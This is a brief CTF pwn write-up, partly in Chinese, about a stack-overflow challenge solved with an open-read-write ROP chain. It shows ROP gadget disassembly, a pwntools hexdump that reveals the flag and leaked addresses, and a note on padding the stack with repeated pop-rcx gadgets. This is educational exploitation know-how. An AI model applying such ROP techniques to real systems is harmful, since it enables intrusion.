
# 思路
栈溢出+orw，本题打one_gadget，和system("/bin/sh")都不通，不知道为什么？

# debug
```
   0x40117e <gadgets+8>:        pop    rcx
   0x40117f <gadgets+9>:        ret
   0x401180 <gadgets+10>:       nop
   0x401181 <gadgets+11>:       pop    rbp
   0x401182 <gadgets+12>:       ret

```

# getshell
```
[DEBUG] Received 0x64 bytes:
    00000000  2e 3b 2c 3b  2e 7b 61 61  61 61 61 61  61 5f 28 e2  │.;,;│.{aa│aaaa│a_(·│
    00000010  95 af c2 b0  e2 96 a1 c2  b0 29 e2 95  af ef b8 b5  │····│····│·)··│····│
    00000020  20 e2 94 bb  e2 94 81 e2  94 bb 5f 61  61 61 61 61  │ ···│····│··_a│aaaa│
    00000030  61 61 7d 0a  93 7f 00 00  50 40 40 00  00 00 00 00  │aa}·│····│P@@·│····│
    00000040  a1 38 5e d5  93 7f 00 00  64 00 00 00  00 00 00 00  │·8^·│····│d···│····│
    00000050  50 3a 65 d5  93 7f 00 00  7e 11 40 00  00 00 00 00  │P:e·│····│~·@·│····│
    00000060  58 40 40 00                                         │X@@·│
    00000064
.;,;.{aaaaaaa_(╯°□°)╯︵ ┻━┻_aaaaaaa}
\x93\x7f\x00\x00P@@\x00\x00\x00\x00\x00\xa18^Փ\x7f\x00\x00d\x00\x00\x00\x00\x00\x00\x00P:eՓ\x7f\x00\x00~\x11@\x00\x00\x00\x00\x00X@@\x00[*] Got EOF while reading in interactive
$

```
![](https://r2.20161023.xyz/pic/20250614183002451.png)


# why p64(pop_rcx)*70？
- to control the rsp,make it to big and big, to prevent program execution failure
- use gdb , find some `push` in the puts function
![](https://r2.20161023.xyz/pic/20250616134452737.png)
![](https://r2.20161023.xyz/pic/20250616134702353.png)
![](https://r2.20161023.xyz/pic/20250616134816208.png)

![](https://r2.20161023.xyz/pic/20250616173956872.png)